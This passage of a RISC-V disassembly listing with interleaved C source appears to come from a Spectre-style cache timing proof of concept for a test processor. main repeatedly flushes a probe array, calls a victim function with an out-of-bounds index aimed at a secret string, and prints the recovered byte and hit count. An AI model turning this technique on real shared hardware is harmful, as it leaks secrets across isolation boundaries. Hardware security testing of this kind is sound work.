    2698:	0007a703          	lw	a4,0(a5)
    269c:	fd842783          	lw	a5,-40(s0)
    26a0:	0007a783          	lw	a5,0(a5)
    26a4:	02e7fa63          	bgeu	a5,a4,26d8 <cacheAttack+0x178>
			outIdx[0] = i;
    26a8:	fe842783          	lw	a5,-24(s0)
    26ac:	0ff7f713          	zext.b	a4,a5
    26b0:	fdc42783          	lw	a5,-36(s0)
    26b4:	00e78023          	sb	a4,0(a5)
			outTimes[0] = results[i];
    26b8:	800297b7          	lui	a5,0x80029
    26bc:	09878713          	addi	a4,a5,152 # 80029098 <results>
    26c0:	fe842783          	lw	a5,-24(s0)
    26c4:	00279793          	slli	a5,a5,0x2
    26c8:	00f707b3          	add	a5,a4,a5
    26cc:	0007a703          	lw	a4,0(a5)
    26d0:	fd842783          	lw	a5,-40(s0)
    26d4:	00e7a023          	sw	a4,0(a5)
	for (uint32_t i = 0; i < RESULT_ARRAY_SIZE; i++){
    26d8:	fe842783          	lw	a5,-24(s0)
    26dc:	00178793          	addi	a5,a5,1
    26e0:	fef42423          	sw	a5,-24(s0)
    26e4:	fe842703          	lw	a4,-24(s0)
    26e8:	0ff00793          	li	a5,255
    26ec:	f8e7fce3          	bgeu	a5,a4,2684 <cacheAttack+0x124>
		}

	}

}
    26f0:	00000013          	nop
    26f4:	00000013          	nop
    26f8:	02c12403          	lw	s0,44(sp)
    26fc:	02812483          	lw	s1,40(sp)
    2700:	03010113          	addi	sp,sp,48
    2704:	00008067          	ret

00002708 <main>:

void main(){
    2708:	fd010113          	addi	sp,sp,-48
    270c:	02112623          	sw	ra,44(sp)
    2710:	02812423          	sw	s0,40(sp)
    2714:	03010413          	addi	s0,sp,48

	char* secretString = SECRET_STRING;
    2718:	000037b7          	lui	a5,0x3
    271c:	b0c78793          	addi	a5,a5,-1268 # 2b0c <main+0x404>
    2720:	fcf42a23          	sw	a5,-44(s0)

	uint32_t attackIdx = (uint32_t)(secretString - (char*)guideArray);
    2724:	fd442703          	lw	a4,-44(s0)
    2728:	800287b7          	lui	a5,0x80028
    272c:	39878793          	addi	a5,a5,920 # 80028398 <guideArray>
    2730:	40f707b3          	sub	a5,a4,a5
    2734:	fef42623          	sw	a5,-20(s0)

    for (int i = 0; i < sizeof(guideArray); i++){
    2738:	fe042423          	sw	zero,-24(s0)
    273c:	0280006f          	j	2764 <main+0x5c>
        guideArray[i] = 1;
    2740:	800287b7          	lui	a5,0x80028
    2744:	39878713          	addi	a4,a5,920 # 80028398 <guideArray>
    2748:	fe842783          	lw	a5,-24(s0)
    274c:	00f707b3          	add	a5,a4,a5
    2750:	00100713          	li	a4,1
    2754:	00e78023          	sb	a4,0(a5)
    for (int i = 0; i < sizeof(guideArray); i++){
    2758:	fe842783          	lw	a5,-24(s0)
    275c:	00178793          	addi	a5,a5,1
    2760:	fef42423          	sw	a5,-24(s0)
    2764:	fe842703          	lw	a4,-24(s0)
    2768:	0ff00793          	li	a5,255
    276c:	fce7fae3          	bgeu	a5,a4,2740 <main+0x38>
    }

	// Write to probeArray so in RAM not copy-on-write zero pages.
	for (int i = 0; i < sizeof(probeArray); i++){
    2770:	fe042223          	sw	zero,-28(s0)
    2774:	0280006f          	j	279c <main+0x94>
		probeArray[i] = 1;
    2778:	800287b7          	lui	a5,0x80028
    277c:	49878713          	addi	a4,a5,1176 # 80028498 <probeArray>
    2780:	fe442783          	lw	a5,-28(s0)
    2784:	00f707b3          	add	a5,a4,a5
    2788:	00100713          	li	a4,1
    278c:	00e78023          	sb	a4,0(a5)
	for (int i = 0; i < sizeof(probeArray); i++){
    2790:	fe442783          	lw	a5,-28(s0)
    2794:	00178793          	addi	a5,a5,1
    2798:	fef42223          	sw	a5,-28(s0)
    279c:	fe442703          	lw	a4,-28(s0)
    27a0:	7ff00793          	li	a5,2047
    27a4:	fce7fae3          	bgeu	a5,a4,2778 <main+0x70>
	}

    *outputAddr = '=';
    27a8:	800007b7          	lui	a5,0x80000
    27ac:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    27b0:	03d00713          	li	a4,61
    27b4:	00e78023          	sb	a4,0(a5)
    *outputAddr = '=';
    27b8:	800007b7          	lui	a5,0x80000
    27bc:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    27c0:	03d00713          	li	a4,61
    27c4:	00e78023          	sb	a4,0(a5)
    *outputAddr = '=';
    27c8:	800007b7          	lui	a5,0x80000
    27cc:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    27d0:	03d00713          	li	a4,61
    27d4:	00e78023          	sb	a4,0(a5)
    *outputAddr = 'S';
    27d8:	800007b7          	lui	a5,0x80000
    27dc:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    27e0:	05300713          	li	a4,83
    27e4:	00e78023          	sb	a4,0(a5)
    *outputAddr = 't';
    27e8:	800007b7          	lui	a5,0x80000
    27ec:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    27f0:	07400713          	li	a4,116
    27f4:	00e78023          	sb	a4,0(a5)
    *outputAddr = 'a';
    27f8:	800007b7          	lui	a5,0x80000
    27fc:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2800:	06100713          	li	a4,97
    2804:	00e78023          	sb	a4,0(a5)
    *outputAddr = 'r';
    2808:	800007b7          	lui	a5,0x80000
    280c:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2810:	07200713          	li	a4,114
    2814:	00e78023          	sb	a4,0(a5)
    *outputAddr = 't';
    2818:	800007b7          	lui	a5,0x80000
    281c:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2820:	07400713          	li	a4,116
    2824:	00e78023          	sb	a4,0(a5)
    *outputAddr = '=';
    2828:	800007b7          	lui	a5,0x80000
    282c:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2830:	03d00713          	li	a4,61
    2834:	00e78023          	sb	a4,0(a5)
    *outputAddr = '=';
    2838:	800007b7          	lui	a5,0x80000
    283c:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2840:	03d00713          	li	a4,61
    2844:	00e78023          	sb	a4,0(a5)
    *outputAddr = '=';
    2848:	800007b7          	lui	a5,0x80000
    284c:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2850:	03d00713          	li	a4,61
    2854:	00e78023          	sb	a4,0(a5)
    *outputAddr = '\n';
    2858:	800007b7          	lui	a5,0x80000
    285c:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2860:	00a00713          	li	a4,10
    2864:	00e78023          	sb	a4,0(a5)

	for(uint32_t len = 0; len < SECRET_LENGTH; len++){
    2868:	fe042023          	sw	zero,-32(s0)
    286c:	1e00006f          	j	2a4c <main+0x344>
	
		// Clear results for every character.
		for(uint32_t cIdx = 0; cIdx < RESULT_ARRAY_SIZE; cIdx++){
    2870:	fc042e23          	sw	zero,-36(s0)
    2874:	0280006f          	j	289c <main+0x194>
			results[cIdx] = 0;
    2878:	800297b7          	lui	a5,0x80029
    287c:	09878713          	addi	a4,a5,152 # 80029098 <results>
    2880:	fdc42783          	lw	a5,-36(s0)
    2884:	00279793          	slli	a5,a5,0x2
    2888:	00f707b3          	add	a5,a4,a5
    288c:	0007a023          	sw	zero,0(a5)
		for(uint32_t cIdx = 0; cIdx < RESULT_ARRAY_SIZE; cIdx++){
    2890:	fdc42783          	lw	a5,-36(s0)
    2894:	00178793          	addi	a5,a5,1
    2898:	fcf42e23          	sw	a5,-36(s0)
    289c:	fdc42703          	lw	a4,-36(s0)
    28a0:	0ff00793          	li	a5,255
    28a4:	fce7fae3          	bgeu	a5,a4,2878 <main+0x170>
		}

		// Run the attack on the same idx for ATTACK_ROUNDS times.
		for(uint32_t atkRound = 0; atkRound < ATTACK_ROUNDS; atkRound++){
    28a8:	fc042c23          	sw	zero,-40(s0)
    28ac:	0640006f          	j	2910 <main+0x208>

			// Make sure array you read from is not in the cache.
			flushCache((uint32_t)probeArray, sizeof(probeArray));
    28b0:	800287b7          	lui	a5,0x80028
    28b4:	49878713          	addi	a4,a5,1176 # 80028498 <probeArray>
    28b8:	000017b7          	lui	a5,0x1
    28bc:	80078593          	addi	a1,a5,-2048 # 800 <_start-0x800>
    28c0:	00070513          	mv	a0,a4
    28c4:	e68ff0ef          	jal	1f2c <flushCache>

			victimFuncInit(attackIdx);
    28c8:	fec42503          	lw	a0,-20(s0)
    28cc:	f6cff0ef          	jal	2038 <victimFuncInit>
			victimFunc[len](attackIdx);
    28d0:	800007b7          	lui	a5,0x80000
    28d4:	37478713          	addi	a4,a5,884 # 80000374 <victimFunc>
    28d8:	fe042783          	lw	a5,-32(s0)
    28dc:	00279793          	slli	a5,a5,0x2
    28e0:	00f707b3          	add	a5,a4,a5
    28e4:	0007a783          	lw	a5,0(a5)
    28e8:	fec42503          	lw	a0,-20(s0)
    28ec:	000780e7          	jalr	a5
					break;
				default:
					break;
			}
*/
			cacheAttack(hitIdx, hitTimes);
    28f0:	800297b7          	lui	a5,0x80029
    28f4:	4a478593          	addi	a1,a5,1188 # 800294a4 <hitTimes>
    28f8:	800297b7          	lui	a5,0x80029
    28fc:	4a078513          	addi	a0,a5,1184 # 800294a0 <hitIdx>
    2900:	c61ff0ef          	jal	2560 <cacheAttack>
		for(uint32_t atkRound = 0; atkRound < ATTACK_ROUNDS; atkRound++){
    2904:	fd842783          	lw	a5,-40(s0)
    2908:	00178793          	addi	a5,a5,1
    290c:	fcf42c23          	sw	a5,-40(s0)
    2910:	fd842703          	lw	a4,-40(s0)
    2914:	00900793          	li	a5,9
    2918:	f8e7fce3          	bgeu	a5,a4,28b0 <main+0x1a8>

		}

		*outputAddr = 'V';
    291c:	800007b7          	lui	a5,0x80000
    2920:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2924:	05600713          	li	a4,86
    2928:	00e78023          	sb	a4,0(a5)
    	*outputAddr = 'a';
    292c:	800007b7          	lui	a5,0x80000
    2930:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2934:	06100713          	li	a4,97
    2938:	00e78023          	sb	a4,0(a5)
    	*outputAddr = 'l';
    293c:	800007b7          	lui	a5,0x80000
    2940:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2944:	06c00713          	li	a4,108
    2948:	00e78023          	sb	a4,0(a5)
    	*outputAddr = 'u';
    294c:	800007b7          	lui	a5,0x80000
    2950:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2954:	07500713          	li	a4,117
    2958:	00e78023          	sb	a4,0(a5)
    	*outputAddr = 'e';
    295c:	800007b7          	lui	a5,0x80000
    2960:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2964:	06500713          	li	a4,101
    2968:	00e78023          	sb	a4,0(a5)
    	*outputAddr = ':';
    296c:	800007b7          	lui	a5,0x80000
    2970:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2974:	03a00713          	li	a4,58
    2978:	00e78023          	sb	a4,0(a5)
    	*outputAddr = ' ';
    297c:	800007b7          	lui	a5,0x80000
    2980:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2984:	02000713          	li	a4,32
    2988:	00e78023          	sb	a4,0(a5)
		*outputAddr = (char)hitIdx[0];
    298c:	800007b7          	lui	a5,0x80000
    2990:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2994:	80029737          	lui	a4,0x80029
    2998:	4a074703          	lbu	a4,1184(a4) # 800294a0 <hitIdx>
    299c:	00e78023          	sb	a4,0(a5)
        *outputAddr = ' ';
    29a0:	800007b7          	lui	a5,0x80000
    29a4:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    29a8:	02000713          	li	a4,32
    29ac:	00e78023          	sb	a4,0(a5)
        *outputAddr = 'H';
    29b0:	800007b7          	lui	a5,0x80000
    29b4:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    29b8:	04800713          	li	a4,72
    29bc:	00e78023          	sb	a4,0(a5)
        *outputAddr = 'i';
    29c0:	800007b7          	lui	a5,0x80000
    29c4:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    29c8:	06900713          	li	a4,105
    29cc:	00e78023          	sb	a4,0(a5)
        *outputAddr = 't';
    29d0:	800007b7          	lui	a5,0x80000
    29d4:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    29d8:	07400713          	li	a4,116
    29dc:	00e78023          	sb	a4,0(a5)
        *outputAddr = ':';
    29e0:	800007b7          	lui	a5,0x80000
    29e4:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    29e8:	03a00713          	li	a4,58
    29ec:	00e78023          	sb	a4,0(a5)
        *outputAddr = ' ';
    29f0:	800007b7          	lui	a5,0x80000
    29f4:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    29f8:	02000713          	li	a4,32
    29fc:	00e78023          	sb	a4,0(a5)
		*outputAddr = (char)hitTimes[0] + '0';
    2a00:	800297b7          	lui	a5,0x80029
    2a04:	4a478793          	addi	a5,a5,1188 # 800294a4 <hitTimes>
    2a08:	0007a783          	lw	a5,0(a5)
    2a0c:	0ff7f713          	zext.b	a4,a5
    2a10:	800007b7          	lui	a5,0x80000
    2a14:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2a18:	03070713          	addi	a4,a4,48
    2a1c:	0ff77713          	zext.b	a4,a4
    2a20:	00e78023          	sb	a4,0(a5)
        *outputAddr = '\n';
    2a24:	800007b7          	lui	a5,0x80000
    2a28:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2a2c:	00a00713          	li	a4,10
    2a30:	00e78023          	sb	a4,0(a5)

		attackIdx++;
    2a34:	fec42783          	lw	a5,-20(s0)
    2a38:	00178793          	addi	a5,a5,1
    2a3c:	fef42623          	sw	a5,-20(s0)
	for(uint32_t len = 0; len < SECRET_LENGTH; len++){
    2a40:	fe042783          	lw	a5,-32(s0)
    2a44:	00178793          	addi	a5,a5,1
    2a48:	fef42023          	sw	a5,-32(s0)
    2a4c:	fe042703          	lw	a4,-32(s0)
    2a50:	00400793          	li	a5,4
    2a54:	e0e7fee3          	bgeu	a5,a4,2870 <main+0x168>

	}

    *outputAddr = '=';
    2a58:	800007b7          	lui	a5,0x80000
    2a5c:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2a60:	03d00713          	li	a4,61
    2a64:	00e78023          	sb	a4,0(a5)
    *outputAddr = '=';
    2a68:	800007b7          	lui	a5,0x80000
    2a6c:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2a70:	03d00713          	li	a4,61
    2a74:	00e78023          	sb	a4,0(a5)
    *outputAddr = '=';
    2a78:	800007b7          	lui	a5,0x80000
    2a7c:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2a80:	03d00713          	li	a4,61
    2a84:	00e78023          	sb	a4,0(a5)
    *outputAddr = 'E';
    2a88:	800007b7          	lui	a5,0x80000
    2a8c:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2a90:	04500713          	li	a4,69
    2a94:	00e78023          	sb	a4,0(a5)
    *outputAddr = 'n';
    2a98:	800007b7          	lui	a5,0x80000
    2a9c:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2aa0:	06e00713          	li	a4,110
    2aa4:	00e78023          	sb	a4,0(a5)
    *outputAddr = 'd';
    2aa8:	800007b7          	lui	a5,0x80000
    2aac:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2ab0:	06400713          	li	a4,100
    2ab4:	00e78023          	sb	a4,0(a5)
    *outputAddr = '=';
    2ab8:	800007b7          	lui	a5,0x80000
    2abc:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2ac0:	03d00713          	li	a4,61
    2ac4:	00e78023          	sb	a4,0(a5)
    *outputAddr = '=';
    2ac8:	800007b7          	lui	a5,0x80000
    2acc:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2ad0:	03d00713          	li	a4,61
    2ad4:	00e78023          	sb	a4,0(a5)
    *outputAddr = '=';
    2ad8:	800007b7          	lui	a5,0x80000
    2adc:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2ae0:	03d00713          	li	a4,61
    2ae4:	00e78023          	sb	a4,0(a5)
    *outputAddr = '\n';
    2ae8:	800007b7          	lui	a5,0x80000
    2aec:	38c7a783          	lw	a5,908(a5) # 8000038c <outputAddr>
    2af0:	00a00713          	li	a4,10
    2af4:	00e78023          	sb	a4,0(a5)

}
    2af8:	00000013          	nop
    2afc:	02c12083          	lw	ra,44(sp)
    2b00:	02812403          	lw	s0,40(sp)
    2b04:	03010113          	addi	sp,sp,48
    2b08:	00008067          	ret
